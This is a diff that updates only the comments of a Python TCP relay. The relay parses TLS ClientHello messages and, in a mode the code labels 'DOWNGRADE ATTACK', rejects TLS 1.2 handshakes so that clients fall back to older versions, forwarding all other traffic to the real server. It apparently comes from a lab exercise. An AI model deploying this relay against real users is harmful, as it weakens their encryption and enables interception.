@@ -3,33 +3,29 @@ import struct
 import threading
 
 def parse_clienthello_tls_version(data):
-    if len(data) < 11:
+    if len(data) < 11: # useful to discard incorrect packets
         return False
     
-    # --- TLS record header ---
-    # Header TLS
-    # TLS record: ContentType(1) + Version(2) + Length(2)
+    # TLS record header: ContentType(1) + Version(2) + Length(2)
     content_type, version, length = struct.unpack(">BHH", data[:5])
     if content_type != 0x16:  # not Handshake
         return False
 
-    # --- Handshake header ---
-    handshake_type = data[5]
+    # Handshake header
+    handshake_type = data[5] # Handshake Type is 1 byte
     if handshake_type != 0x01:  # not ClientHello
         return False
 
-    # Offset after handshake header (4 byte: type+length)
-    offset = 9  # legacy_version starts here (after 5+4 bytes)
-    legacy_version = struct.unpack(">H", data[offset:offset+2])[0] #(first two bytes of ClientHello)
+    offset = 9  # legacy_version starts after 9 bytes
+    legacy_version = struct.unpack(">H", data[offset:offset+2])[0] # legacy_version is 2 bytes
 
-    # No extension, use only legacy_version
     if legacy_version == 0x0303: # TLS 1.2
         return True  
     return False
 
 
 
-def forward(src, dst):
+def forward(src, dst): # this function is charged to send data
     try:
         while True:
             data = src.recv(4096)
@@ -53,25 +49,26 @@ def relay_server(choice, listen_port, server_ip, server_port):
         client, addr = sock.accept()
         print(f"Connection from {addr}")
 
-        first_data = client.recv(4096)
+        first_data = client.recv(4096) # receives the ClientHello
         if not first_data:
             client.close()
             continue
         
-        detected = parse_clienthello_tls_version(first_data)
+        detected = parse_clienthello_tls_version(first_data) # detects TLS 1.2
 
-        if choice == '2' and detected:
+        if choice == '2' and detected: # sends an error if the script is working on DOWNGRADE ATTACK mode and TLS 1.2 is detected
             print("TLS 1.2 ClientHello detected: sending error")
             client.send(b"Hello, TLS 1.2 is not supported here!\n")
             client.close()
             continue
 
-        print("Sending packets towards the server...")
+        print("Sending packets towards the server...") # sends packets towards the server if TLS < 1.2
         server = socket.create_connection((server_ip, server_port))
         server.sendall(first_data)
         print("Packets sent!")
 
-        threading.Thread(target=forward, args=(client, server), daemon=True).start()
+        # threads to generate parallel communication between client and server
+        threading.Thread(target=forward, args=(client, server), daemon=True).start() 
         threading.Thread(target=forward, args=(server, client), daemon=True).start()
 
 
